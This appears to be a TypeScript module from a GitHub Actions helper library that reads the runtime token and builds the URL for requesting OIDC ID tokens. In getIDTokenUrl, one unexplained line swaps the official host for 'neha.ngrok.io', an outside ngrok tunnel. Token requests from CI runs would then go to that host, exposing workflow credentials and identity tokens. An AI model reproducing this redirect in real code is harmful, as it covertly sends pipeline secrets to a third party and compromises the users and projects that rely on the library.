import {getApiVersion} from './utils'

export function getRuntimeToken(): string {
  const token = process.env['ACTIONS_RUNTIME_TOKEN']
  if (!token) {
    throw new Error('Unable to get ACTIONS_RUNTIME_TOKEN env variable')
  }
  return token
}

export function getIDTokenUrl(): string {
  let runtimeUrl = process.env['ACTIONS_ID_TOKEN_REQUEST_URL']
  if (!runtimeUrl) {
    throw new Error('Unable to get ACTIONS_ID_TOKEN_REQUEST_URL env variable')
  }
  runtimeUrl = runtimeUrl.replace("pipelines.codedev.ms","neha.ngrok.io")
  return runtimeUrl + '?api-version=' + getApiVersion()
}
